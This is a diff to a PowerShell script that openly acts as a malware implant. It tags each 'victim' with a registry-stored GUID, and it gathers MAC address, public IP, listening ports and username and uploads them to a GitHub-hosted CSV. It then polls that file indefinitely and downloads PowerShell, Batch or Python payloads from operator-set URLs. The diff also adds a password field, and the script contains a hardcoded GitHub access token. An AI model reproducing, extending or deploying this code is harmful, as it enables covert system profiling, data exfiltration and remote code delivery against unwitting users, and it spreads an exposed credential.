@@ -4,7 +4,7 @@
 # ===============================================
 
 # === CONFIGURATION SETTINGS ===
-$GitHubToken          = "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"  # <- Change this
+$GitHubToken          = "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"
 $RepoOwner            = "Umair13303"
 $RepoName             = "DEV_Payload"
 $CsvPathInRepo        = "GitHub_Script/Excel/Victim_Record_GitHub.csv"
@@ -22,12 +22,12 @@ $UserAgent            = "Watcher-Script"
 
 # === LOGGING FUNCTION ===
 function Log-Message {
-    param([string]$Text)
+    param ([string]$Text)
     $Text | Out-File -Append $LogFile
     Write-Host $Text
 }
 
-# === CREATE PAYLOAD FOLDER AND INITIAL LOG ===
+# === CREATE PAYLOAD FOLDER & LOG START ===
 if (-not (Test-Path $PayloadFolder)) {
     New-Item -ItemType Directory -Path $PayloadFolder | Out-Null
 }
@@ -45,6 +45,7 @@ if (-not $Victim_GUID -or $Victim_GUID -eq "") {
         $Victim_GUID = Get-Content -Path $GuidFile -Raw
     }
 }
+
 if (-not $Victim_GUID -or $Victim_GUID -eq "") {
     $Victim_GUID = [guid]::NewGuid().ToString()
     Set-ItemProperty -Path $RegistryKey -Name $RegistryValue -Value $Victim_GUID -Force
@@ -52,13 +53,16 @@ if (-not $Victim_GUID -or $Victim_GUID -eq "") {
 }
 Log-Message "[$(Get-Date)] GUID: $Victim_GUID"
 
-# === INIT WEB CLIENT ===
+# === INITIALIZE WEB CLIENT ===
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add("Authorization", "token $GitHubToken")
 $wc.Headers.Add("User-Agent", $UserAgent)
 $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 
-# === REGISTER VICTIM IN CSV ===
+# === WAIT BEFORE REGISTRATION ===
+Start-Sleep -Seconds $FirstWaitSeconds
+
+# === REGISTER VICTIM IF NOT EXISTS ===
 try {
     $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
     $metaJson = $wc.DownloadString($MetaURL)
@@ -68,6 +72,7 @@ try {
 
     $csvText = $wc.DownloadString($downloadUrl)
     $lines = $csvText -split "`r?`n"
+
     $alreadyExists = $false
 
     foreach ($line in $lines) {
@@ -81,12 +86,22 @@ try {
     }
 
     if (-not $alreadyExists) {
+        Log-Message "[$(Get-Date)] 🟢 Victim not found—registering..."
+
+        # Collect system info
         $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
         $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
         try { $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { $ip = "UNKNOWN" }
+        try {
+            $ports = netstat -an | Select-String "LISTENING" | ForEach-Object {
+                ($_ -split "\s+")[-2] -replace ".*:", ""
+            }
+            $ports = ($ports | Sort-Object -Unique) -join ","
+        } catch { $ports = "UNKNOWN" }
         $user = $env:USERNAME
-        $ports = "N/A"
+        $pass = "NOT_CAPTURED"
 
+        # Generate new ID
         $lastId = 0
         foreach ($line in $lines) {
             if ($line -match "^\d+,") {
@@ -97,7 +112,7 @@ try {
             }
         }
         $newId = $lastId + 1
-        $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,,,FALSE"
+        $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,$pass,,,FALSE"
 
         $allLines = $lines + $newRow
         $finalCsv = ($allLines -join "`n")
@@ -119,14 +134,13 @@ try {
         $reqStream.Write($bytes, 0, $bytes.Length)
         $reqStream.Close()
         $upload.GetResponse().Close()
+    } else {
+        Log-Message "[$(Get-Date)] 🟢 Victim already registered."
     }
 }
 catch {
     Log-Message "[$(Get-Date)] ❌ Registration failed: $_"
 }
-
-# === WAIT BEFORE POLLING ===
-Start-Sleep -Seconds $FirstWaitSeconds
 
 # === POLLING LOOP ===
 while ($true) {
@@ -138,14 +152,22 @@ while ($true) {
         foreach ($line in $lines) {
             if ($line -match "^\d+,") {
                 $cols = $line -split ","
-                if ($cols[1] -eq $Victim_GUID -and $cols[8].Trim() -eq "TRUE") {
+
+                # === IMPORTANT: CORRECT COLUMN INDEXES ===
+                $status = $cols[9].Trim().ToUpper()
+                if ($cols[1] -eq $Victim_GUID -and $status -eq "TRUE") {
                     $foundPayload = $true
-                    $payloadType = $cols[6].Trim()
-                    $payloadURL = $cols[7].Trim()
+                    $payloadType = $cols[7].Trim()
+                    $payloadURL  = $cols[8].Trim()
+
+                    if (-not $payloadURL -or $payloadURL -eq "") {
+                        Log-Message "[$(Get-Date)] ⚠️ No payload URL specified—skipping."
+                        continue
+                    }
 
                     $ext = ".txt"
                     if ($payloadType -eq "PowerShell") { $ext = ".ps1" }
-                    elseif ($payloadType -eq "Batch") { $ext = ".bat" }
+                    elseif ($payloadType -eq "Batch")  { $ext = ".bat" }
                     elseif ($payloadType -eq "Python") { $ext = ".py" }
                     else {
                         Log-Message "[$(Get-Date)] ⚠️ Unknown payload type: $payloadType"
@@ -172,11 +194,12 @@ while ($true) {
         }
 
         if (-not $foundPayload) {
-            Log-Message "[$(Get-Date)] ⚠️ No payload assigned."
+            Log-Message "[$(Get-Date)] ⚠️ No matching active payload for this GUID."
         }
     }
     catch {
         Log-Message "[$(Get-Date)] ❌ Polling error: $_"
     }
+
     Start-Sleep -Seconds $LoopIntervalSeconds
 }
